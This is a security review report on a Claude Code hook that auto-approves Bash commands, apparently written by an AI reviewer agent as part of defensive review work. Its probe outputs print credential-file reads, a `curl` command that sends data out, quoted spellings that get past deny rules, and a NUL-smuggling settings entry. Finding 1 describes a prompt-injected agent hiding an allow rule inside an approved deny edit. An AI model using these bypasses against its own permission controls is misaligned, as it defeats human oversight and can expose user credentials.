Commit: 184b499

# Security Review — integrate/q077-q078-q080, iteration 2 (fix commit 184b499)

**Scope:** `git diff df11830 184b499`: `hooks/auto-approve-allowed-commands.sh` (read in full at 184b499, `:1-441` plus the extractor boundary), `test/auto-approve-allowed-commands.bats`, `hooks/wiring.json`, `guides/bare-host-hook-wiring.md`, `docs/decisions/log.md` row 53. The rest of the branch is context only.
**Date:** 2026-09-27
**Based on:** prior reports `security-review-2026-09-27.md`, `architecture-review-2026-09-27.md` (2, 3), `api-consistency-review-2026-09-27.md` (F1), `performance-review-2026-09-27.md` (1). The fact-check reports cover 795ff71, not this fix. Every behavioural statement below is therefore probe output, not a fact-check verdict.
**Method:** a scratch clone checked out at 184b499 (`scratchpad/sec/i2/co`). Probes are `scratchpad/sec/i2/probe-i2.sh` and `probe-i2b.sh`, with output in `probe-i2.out` / `probe-i2b.out`. Each probe runs the hook with an isolated `HOME`, an explicit `CLAUDE_CONFIG_DIR` (cc-isolated exports one, so the variable is never inherited), `timeout 10` and a fresh git repo. These files are not committed.

## Prior findings: status

| Prior | Status | Evidence (probe output, 184b499) |
|---|---|---|
| Sec 1: unparseable file drops later files' denies, allows still load | **Resolved** | Global `{not json`, `{"permissions":[]}`, `deny:"Bash"`, `deny:{…}`: `fall` for the credentials read **and** for `cat README`, so nothing is approved. Malformed project `settings.json` with deny+allow in `.local`: `fall`. Control with all files valid: credentials `fall`, `cat README` `ALLOW`. |
| Sec 2: quoted spellings bypass command-prefix deny | **Resolved** for the reported class | allow `Bash(git:*)`, deny `Bash(git push:*)`: `git "push"`, `git 'push'`, `git \push`, `git pu""sh`, `echo ok && git "push"`, `${X:-push}`, `${X-push}`, `${X:=push}`, `${X+push}`, `${X:-${Y:-push}}`, `$"push"`, `$'push'` and `$(echo push)` all give `fall`. `git status` gives `ALLOW`. `git ${X?push}` gives `ALLOW`: when `X` is unset it aborts instead of running `push`, so this is the variable class (commit notes). |
| Sec 3: hook reads `$HOME/.claude`, linker writes `$CLAUDE_CONFIG_DIR` | **Resolved**, with a narrower residual (new Finding 2) | Deny in `$CLAUDE_CONFIG_DIR/settings.json`: `fall`. An empty `CLAUDE_CONFIG_DIR` falls back to `~/.claude`: `fall`. |
| Sec 4: "never approves a match" overclaim | **Resolved**, except one gap in the new header (Finding 1) | The guide, `wiring.json` and row 53 now defer to the header, and the header states the fail-closed conditions and residuals (`:55-72`). |
| Sec 5: residual determined-injection exfiltration | **Unchanged, accepted** | `.jso[n]`, `.js{on,}`, `$'\x2e'…` and `.c*` still get `ALLOW`, as the header `:63-72` says. `.cred""entials.json` and `.c\redentials.json` now give `fall`, an improvement. |
| Arch 2: settings-source list, config root | **Resolved** | One `settings_files()` (`:130-135`). Managed and `--settings` sources are documented as not read (`:69-71`). |
| Arch 3: two parsers, opposite failure direction | **Resolved** | One `parse_bash_rule` (`:186-201`). The loader fails closed for deny, and for an ill-shaped allow list too (safe direction). |
| API F1: same rule string, different meaning | **Resolved (documented)** | All rows of the header table `:86-91` reproduce: `Bash(ls)` allow approves `ls -la` and `ls/x`, deny matches `ls` only. Allow `Bash(rm:*)` does not approve `rmdir`, deny `Bash(rm:*)` blocks it. Allow `Bash(ls *)` approves nothing, deny `Bash(ls *)` blocks `ls -la`. Deny `Bash`, `Bash(*)` and `Bash(**)` block `ls`, and a bare `Bash` allow is ignored. |
| Perf 1: per-file jq spawns | **Resolved in structure** (one `jq` for all files, `:179`, and one `git`, `:132`). Latency is not re-measured here: route to performance / code-fact-check. | |

## Trust Boundary Map

```
B1: [agent-authored Bash command, S1]                     → [matches_deny raw+de-quoted :287-306, shfmt extraction, per-command deny+allow :419-431] → [PreToolUse "allow"]
B2 (moved): [settings files S2/S3 via settings_files()]   → [one jq pass :145-180, NUL-framed records, load_rules :240-276]                        → [ALLOW_PREFIXES / DENY_GLOBS / DENY_ALL]
B3: [hooks/wiring.json → linker → ${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json] → [same path resolution in settings_files :133]                       → [B2 input]
B4: [hook "allow"]                                        → [Claude Code permission engine]                                                         → [does permissions.deny still apply after allow? unverified, Claim 20b]
```

| Label | Source | Mutability | Trust classification (per sink) |
|---|---|---|---|
| S1 | `tool_input.command` | request-time | UNTRUSTED for every sink (deny/allow matchers, the de-quote regex loop, shfmt) |
| S2 | `${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json` | runtime-mutable: the linker and the user write it, and the agent is denied Edit/Write on it | Trusted for rule content. UNTRUSTED for well-formedness and file type toward the jq sink. |
| S3 | `<git root or cwd>/.claude/settings.json`, `.local.json` | runtime-mutable. The agent can propose Edit/Write, and guard-trusted-writes asks the user. | UNTRUSTED toward the allow-list sink. Content a user approved may carry encodings the user did not read closely (Finding 1). |
| S5 | `CLAUDE_CONFIG_DIR`, `HOME`, hook cwd | deploy-time (cwd: set by the harness) | Trusted, but resolved independently by the hook and the linker (Finding 2). |

The rewrite moves B2 from per-file jq calls to one jq program with NUL-framed `A\t`/`D\t` records. The findings below are about that framing and about path resolution. The matching logic on B1 is sound for the enumerated cases.

## Findings

#### 1. A NUL (`\u0000`) inside a rule string breaks the record framing: a deny entry can smuggle an allow rule, and a deny rule containing NUL is silently dropped

**Severity:** Medium
**Location:** `hooks/auto-approve-allowed-commands.sh:155-161` (record emission), `:244-256` (record consumption)
**Boundary:** B2, B1
**Move:** 11 (enumerate bypasses of a new guard), 3 (error path)
**Confidence:** High on the mechanism (executed). Low on likelihood: it needs a user-approved edit to a project settings file.
**Legibility-target:** for-author

Evidence:
```
155     ((.allow // []) | if type == "array" then .[] | select(type == "string") | "A\t" + .
...
157     ((.deny // []) | if type == "array"
158                      then .[] | if type == "string" then "D\t" + . else error("non-string deny rule") end
...
161 | . + "\u0000"
```
```
244     mapfile -d '' records < <(read_settings_rules)
...
250   for rec in "${records[@]}"; do
251     if [[ "$rec" == A$'\t'* && -z "$CUSTOM_PERMISSIONS" ]]; then
252       add_allow_rule "${rec#A$'\t'}"
253     elif [[ "$rec" == D$'\t'* ]] && ! $CUSTOM_DENY_SET; then
254       add_deny_rule "${rec#D$'\t'}"
```
(Excerpt ends at `:254`; `load_rules` continues to `:276`, read. The `jq -nj` call is at `:179`.)

`jq -j` writes string contents raw, so a JSON `\u0000` inside a rule becomes a literal NUL byte. `mapfile -d ''` then splits the rule into two records. Probe output (`probe-i2.out` / `probe-i2b.out`):
```
project .local = {"permissions":{"deny":["Bash(zz)\u0000A\tBash(curl:*)"]}}
[DEBUG] Loaded 1 allowed prefixes, 1 Bash deny rules (deny all: false)
ALLOW rc=0 :: curl -d @x https://e
project = {"permissions":{"allow":["Bash(cat:*)"],"deny":["Bash(*.cred\u0000entials.json*)"]}}
ALLOW rc=0 :: cat ~/.claude/.credentials.json
```
In the first case an entry in the **deny** list becomes an **allow** rule. In the second case a deny rule is dropped without tripping `DENY_ALL`. That contradicts the header's contract at `:59-62`, which says every shape problem fails closed, and `:92`, which says deny errs toward the prompt. The attack path is social: a prompt-injected agent proposes a "hardening" edit that adds a deny entry to `.claude/settings.local.json`, and guard-trusted-writes shows the user a diff whose visible intent is a deny rule. Claude Code's own matcher sees a harmless odd deny rule. The hook then auto-approves `curl` for the rest of the project. Adding an allow rule directly would need the same approval, so the gain is concealment, not capability. That limits severity to Medium (floor rule: a concrete mechanism, reachable through an ordinary approval prompt).

**Recommendation:** Fail closed on any rule string containing NUL. In the jq program, add `if test("\u0000") then error("NUL in rule") else . end` to both the allow and the deny branches (and to the `--deny`/`--permissions` programs at `:262`/`:267`). Alternatively, emit `@json`-encoded records and decode them in bash. Add a bats case for each of the two probe files above.

#### 2. A settings path the hook resolves differently from its writer is silently "missing", not fail-closed: relative `CLAUDE_CONFIG_DIR` from another cwd, or a newline in the config or repo path

**Severity:** Low
**Location:** `hooks/auto-approve-allowed-commands.sh:130-135`, `:169-176`
**Boundary:** B3, B2
**Move:** 1 (trace boundaries), 3 (error path)
**Confidence:** High on the mechanism (executed). Low on exposure. Both variants need an unusual deploy-time configuration, and the relative case also needs the hook's cwd to differ from the directory the path was meant relative to. Whether Claude Code runs hooks in the Bash tool's current directory is untested.
**Legibility-target:** for-author

Evidence:
```
133   printf '%s\n' "${CLAUDE_CONFIG_DIR:-$HOME/.claude}/settings.json" \
134     "${root:-.}/.claude/settings.json" "${root:-.}/.claude/settings.local.json"
...
169   mapfile -t candidates < <(settings_files)
170   for f in "${candidates[@]}"; do
171     if [[ -e "$f" ]]; then
...
174       debug "Settings file not found: $f"
```
(Excerpt ends at `:174`; `read_settings_rules` continues to `:180`, read.)

Probe output, with the deny in the config dir and `Bash(cat:*)` allowed in the project `.local`:
```
-- relative CLAUDE_CONFIG_DIR ('../cfg' from proj)
fall  rc=0 :: cat ~/.claude/.credentials.json
-- relative CLAUDE_CONFIG_DIR, hook cwd in a subdir (resolves elsewhere)
ALLOW rc=0 :: cat ~/.claude/.credentials.json
-- CLAUDE_CONFIG_DIR with a newline
ALLOW rc=0 :: cat ~/.claude/.credentials.json
```
A missing file contributes no rules by design. But in both cases the global deny rules vanish while the project allow rules still load, which is the same asymmetry as prior Finding 1, now on the "not found" path rather than the "unparseable" one. The relative case is documented in the header (`:75-76`), but the header does not say that the result is fail-open for deny. A newline in the repo path splits the project paths in the same way (the probe showed the project's own rules lost). A leading `-` in a relative config dir makes jq read it as an option, and that one does fail closed (`deny all: true`). This sits below the floor rule's bar: `CLAUDE_CONFIG_DIR` is operator-set deploy-time configuration, not attacker-reachable input.

**Recommendation:** In `settings_files`, resolve a relative `CLAUDE_CONFIG_DIR` to an absolute path, or treat it as unreadable and set `DENY_ALL`. Emit the paths NUL-delimited (`printf '%s\0'`, `mapfile -d ''`). Add one header line saying that a global file the hook cannot find contributes no deny rules.

#### 3. `-e` in place of `-f` makes a FIFO or character device at a settings path hang the hook until Claude Code's hook timeout (fails safe)

**Severity:** Informational
**Location:** `hooks/auto-approve-allowed-commands.sh:171` (df11830 used `[[ -f "$file" ]]`)
**Boundary:** B2
**Move:** 3 (error path)
**Confidence:** High (executed). The timeout behaviour of Claude Code is [assumed]: `wiring.json` sets no `timeout`, so the harness default applies.
**Legibility-target:** for-author

Evidence:
```
171     if [[ -e "$f" ]]; then
```
```
[symlink to /dev/zero]
fall  rc=124 :: cat README
[FIFO (no writer)]
fall  rc=124 :: cat README
```
(rc 124 is the probe's own `timeout 10`.) At df11830 the `-f` test skipped non-regular files, so this is a regression in availability only. A hung hook yields no `allow`, so the security property holds. Planting a FIFO at `.claude/settings.local.json` needs an approved Bash write naming that path, and the protected-policy guard blocks such writes. Directories, unreadable files, `/dev/null` and empty files all fail closed immediately. Only blocking reads hang.

**Recommendation:** Use `[[ -e "$f" && ! -f "$f" ]] → DENY_ALL` (fail closed without reading), or keep `-e` and read with a jq wall-clock guard. Either way, document the choice.

### Cleared regression candidates (executed unless noted)

| Candidate | Result | Disposition |
|---|---|---|
| Duplicate keys (`"deny":[…],"deny":[]`) | the last value wins (jq 1.6) | Cleared. Node's `JSON.parse` is also last-wins [assumed], so Claude Code and the hook agree. The file content is trusted (S2). |
| Huge numbers (`1e999999`, 30-digit ints) | parses, rules load | cleared |
| Trailing NUL / NUL inside a key / UTF-8 BOM | jq 1.6 accepts, rules load | Cleared for deny: the rules are read. The hook's notion of "one JSON object" is jq 1.6's, not Claude Code's; noted in Not verified below. |
| UTF-16LE BOM, empty, whitespace-only, `null`, two documents, a 2nd document allowing `curl`, `deny:[null]` | `fall` for all commands | fail closed as the header says |
| `permissions: null`, non-string allow entry | the other rules load, credentials `fall` | as documented |
| Directory, mode 000, symlink to `/dev/null` | `fall` for all | fail closed |
| Dangling symlink | treated as missing | same as before, documented in the commit |
| jq 1.6 `input_filename` for files with no trailing newline | reports the correct names, and the document-count check passes | cleared |
| `--args` with paths containing spaces or a leading-`-` component | rules load (space) / fail closed (leading `-` in a relative config dir) | cleared |
| Paths containing a newline | the file is silently missing | Finding 2 |
| De-quoting creating an approve path | none found. `matches_deny` returns true on raw **or** de-quoted (`:300`), and the de-quoted string is used nowhere else. | cleared (read-static + probes) |
| De-quote loop termination / cost | each iteration removes ≥ 4 characters, so it terminates. 8000 `${A:-x}` (56 KB) takes 2.9 s, against 0.14 s for 56 KB plain. | Cleared. Quadratic but bounded by command size, and a timeout fails safe. |
| `--deny` `not-json` / `[1]` / two arrays / `[]` | fall / fall / fall (first array's rules) / ALLOW | as documented. `[]` means no deny rules. |
| cwd outside a repo reads `./.claude/` | `ALLOW` from cwd rules | Unchanged from df11830 (it had the same `else` branch). Carried as an untested candidate from the prior report. |

### Untested bypass candidates

- **B4: Claude Code re-applying `permissions.deny` after a hook `allow`.** Needs a live host (Claim 20b). The header now says the hook is load-bearing until that is settled, which is the correct stance.
- **Hook process cwd after the agent `cd`s.** This decides whether Finding 2's relative case and the cwd `.claude/` allow source can be reached. It needs the live harness.
- **Claude Code's JSON parser vs jq 1.6 on BOM, NUL and duplicate keys.** Allow rules from a file Claude Code rejects would still drive hook approvals. Not testable offline.

## Endorsement Claims

- **Claim:** After 184b499, a settings file that exists and fails jq parsing or shape checks makes the hook approve nothing on that call, whichever of the three files it is.
  **Location:** `hooks/auto-approve-allowed-commands.sh:145-180, 240-249, 287-292`
  **Evidence:** executed
  **Verified:** the `probe-i2.sh` failure shapes listed in the status table and in Cleared (global and project, 11 shapes), each giving `fall` for an allow-listed `cat README`.
  **Not verified:** files the hook never finds (Finding 2), and NUL-bearing rule strings that parse as valid (Finding 1).
  **route: code-fact-check**
- **Claim:** The de-quoted comparison only adds deny matches. `dq` is compared only inside `matches_deny` and is OR-ed with the raw match.
  **Location:** `hooks/auto-approve-allowed-commands.sh:287-306`
  **Evidence:** executed (probes) and read-static (use sites)
  **Verified:** `grep`-level read of `dq` uses in the function, plus the 15 git-push spellings above.
  **Not verified:** the extraction path's rendering of `ParamExp` in `extract_commands_from_string`, which feeds the per-command `matches_deny` call at `:422`.
  **route: code-fact-check**
- **Claim:** The global path the hook reads equals the linker's `DEST` for an absolute or empty `CLAUDE_CONFIG_DIR`.
  **Location:** `hooks/auto-approve-allowed-commands.sh:133`; `devcontainer-config/link-claude-home.sh:36`
  **Evidence:** executed
  **Verified:** probes with an absolute config dir, an empty value, and a path containing a space.
  **Not verified:** relative values and values containing a newline (Finding 2).

## Primitive sweep

Primitive: glob / regex matching of S1-derived strings

| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `:300` `[[ "$str" == $glob \|\| "$dq" == $glob ]]` | S1 against S2/S3 | `add_deny_rule` escapes everything except `*` (`:224-231`) | cleared (the `?`, `[1]` and extglob literals are pinned by tests) |
| `:294` `[[ "$dq" =~ $PARAM_DEFAULT_RE ]]` | S1 against a code-constant regex | none needed | cleared (terminates, bounded cost) |
| `:295` `${dq/"${BASH_REMATCH[0]}"/…}` | S1 | pattern quoted, so literal | cleared |
| `:320` `is_command_allowed` prefix match | S1 against S2/S3 | right-hand prefix quoted | cleared (pre-existing) |
| `:193`, `:196` `parse_bash_rule` patterns | S2/S3 | literal patterns | cleared |

Primitive: JSON parse / record framing of settings (jq)

| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `:179` single pass over the settings files | S2/S3 | shape checks, document count, `wait $!` → `DENY_ALL` | Finding 1 (NUL framing), Finding 3 (blocking reads) |
| `:261-262` `--permissions` | test argument | none (fails safe) | cleared (test-only; same NUL framing, no production reach) |
| `:267-273` `--deny` | test argument | `wait $!` → `DENY_ALL` | cleared (test-only) |
| `:362` `tool_input.command` | S1 | `// empty` | pre-existing, cleared |

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence |
|---|---|---|---|---|---|
| 1 | NUL in a rule string smuggles an allow record from a deny entry, and silently drops a deny rule | Medium | B2, B1 | `hooks/auto-approve-allowed-commands.sh:155-161, 244-256` | High (mechanism), Low (likelihood) |
| 2 | Relative / newline-bearing settings paths are silently missing: global denies lost, project allows kept | Low | B3, B2 | `hooks/auto-approve-allowed-commands.sh:130-135, 169-176` | High (mechanism), Low (exposure) |
| 3 | `-e` instead of `-f`: a FIFO or device settings path hangs the hook (fails safe) | Informational | B2 | `hooks/auto-approve-allowed-commands.sh:171` | High |

## Overall Assessment

The fix commit resolves all four prior security findings and the linked architecture, API and performance findings. Deny loading now fails closed on every malformed shape probed, the quoted and `${X:-word}` spellings of a command-prefix deny rule fall through, the global path follows `CLAUDE_CONFIG_DIR`, and the docs now defer to one header that is mostly accurate. The rewrite introduced one new fail-open path of note, Finding 1. The NUL-framed record stream lets a `\u0000` inside a rule string split it, which turns part of a deny entry into an allow rule and drops the rest without setting `DENY_ALL`. It is a one-line jq fix, and it is the only thing I would fix before merge, because it breaks the header's own "deny only ever narrows" contract. Finding 2 is a narrower leftover of prior Finding 3 in unusual deploy configurations. Finding 3 is availability only. There are no findings beyond these within the code paths read. The endorsement claims are executed but still pending code-fact-check verdicts. Claude Code's behaviour at B4 still decides whether this hook is the last line of defence.

## Goal-Alignment Note

- **Success criterion:** "A markdown report saved to /workspace/docs/reviews/security-review-2026-09-27-iter2.md, structured per the security-reviewer skill, stating for each prior finding resolved/still-open, listing any new findings, with a Goal-Alignment Note."
- **Answered:** status for sec 1–5, arch 2/3, api F1 and perf 1 (all resolved or unchanged-accepted, see the status table). A regression sweep of the rewritten loader and de-quoting covered unusual JSON, special files, path shapes, `--args` counting, de-quote approve paths and cost. Three new findings (Medium, Low, Informational). The header's GUARANTEES/RESIDUALS text holds except for the NUL case (Finding 1) and the unstated not-found path (Finding 2).
- **Out of scope:** Q-078 and Q-080 changes. The extractor (`extract_commands_from_string`) beyond its interface. Re-measuring latency (perf 1 is resolved in structure only). The bats suite was not re-run; the commit says each regression test fails on df11830.
- **Escalate:** Finding 1 before merge. B4 (Claim 20b) remains the host check that decides whether this hook is load-bearing.
- **Decisions I made:** rated Finding 1 Medium under the floor rule, although it needs a user-approved settings edit, because the deny-to-allow conversion conceals intent in exactly the diff a user is asked to approve. Rated Finding 2 Low because `CLAUDE_CONFIG_DIR` is operator-set deploy-time configuration.
